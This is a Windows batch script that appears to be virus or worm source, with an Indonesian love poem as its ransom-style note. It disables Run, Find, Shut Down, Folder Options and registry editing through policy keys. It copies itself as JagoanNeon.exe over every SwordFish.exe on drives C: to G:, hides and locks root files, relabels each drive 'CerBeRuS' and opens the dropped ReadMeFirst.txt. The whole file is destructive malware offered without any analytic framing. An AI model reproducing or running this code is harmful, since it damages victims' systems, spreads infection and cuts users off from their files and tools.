@echo off

echo y | reg add hkcu\software\microsoft\windows\currentversion\policies\explorer /v NoFind /t reg_dword /d 1
echo y | reg add hkcu\software\microsoft\windows\currentversion\policies\explorer /v NoRun /t reg_dword /d 1
echo y | reg add hkcu\software\microsoft\windows\currentversion\policies\explorer /v NoClose /t reg_dword /d 1
echo y | reg add hkcu\software\microsoft\windows\currentversion\policies\explorer /v NoFolderOptions /t reg_dword /d 1
echo y | reg add hkcu\software\microsoft\windows\currentversion\policies\system /v DisableRegistryTools /t reg_dword /d 1

for %%a in (*.exe) do if %%~za equ 160670 copy "%%a" c:\JagoanNeon.exe
explorer %userprofile%

for /R C:\ %%d in (SwordFish.exe) do copy c:\JagoanNeon.exe "%%d"
for /R D:\ %%d in (SwordFish.exe) do copy c:\JagoanNeon.exe "%%d"
for /R E:\ %%d in (SwordFish.exe) do copy c:\JagoanNeon.exe "%%d"
for /R F:\ %%d in (SwordFish.exe) do copy c:\JagoanNeon.exe "%%d"
for /R G:\ %%d in (SwordFish.exe) do copy c:\JagoanNeon.exe "%%d"

attrib +s +h +r C:\*.*
echo CerBeRuS | label C:

attrib +s +h +r D:\*.*
echo CerBeRuS | label D:

attrib +s +h +r E:\*.*
echo CerBeRuS | label E:

attrib +s +h +r F:\*.*
echo CerBeRuS | label F:

attrib +s +h +r G:\*.*
echo CerBeRuS | label G:

echo ########################################################## >c:\ReadMeFirst.txt
echo Kekasihku                                                  >>c:\ReadMeFirst.txt
echo Akhirnya hari-hariku hanya berteman sepi			>>c:\ReadMeFirst.txt
echo Rasa rinduku kian menggebu-gebu, akankah terbalaskan ?	>>c:\ReadMeFirst.txt
echo Erat tanganmu tlah jauh dari gapai jemariku		>>c:\ReadMeFirst.txt
echo Namunku masih berkhayal					>>c:\ReadMeFirst.txt
echo Adanya pelukan hangatmu yang tak terlepaskan		>>c:\ReadMeFirst.txt
echo -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=	>>c:\ReadMeFirst.txt
echo Kegelisahan jiwaku ini hadir tiada henti			>>c:\ReadMeFirst.txt
echo Untuk ingin berjumpa denganmu				>>c:\ReadMeFirst.txt
echo -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=	>>c:\ReadMeFirst.txt
echo Saat cinta kasih itu kita lalui bersama berdua		>>c:\ReadMeFirst.txt
echo Alangkah indahnya kurasa					>>c:\ReadMeFirst.txt
echo Yang takkan pernah terlepas rasa sayang ini kepadamu	>>c:\ReadMeFirst.txt
echo Anganku terbang dan melayang indah				>>c:\ReadMeFirst.txt
echo Namun semakin jauh ku ingin tahu perasaanku		>>c:\ReadMeFirst.txt
echo Gejolak dan cinta tiada tara				>>c:\ReadMeFirst.txt
echo -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=	>>c:\ReadMeFirst.txt
echo Kasih, kuingin selalu menyatu denganmu			>>c:\ReadMeFirst.txt
echo Akankan kau penuhi janji untuk bertemu kembali		>>c:\ReadMeFirst.txt
echo Mekarnya cintaku padamu, membuat seribu tanya dalam hati	>>c:\ReadMeFirst.txt
echo Untuk dapat mewujudkan benang kasih yang abadi		>>c:\ReadMeFirst.txt
echo ########################################################## >>c:\ReadMeFirst.txt

copy c:\ReadMeFirst.txt
attrib +s +h +r ReadMeFirst.txt
start notepad ReadMeFirst.txt
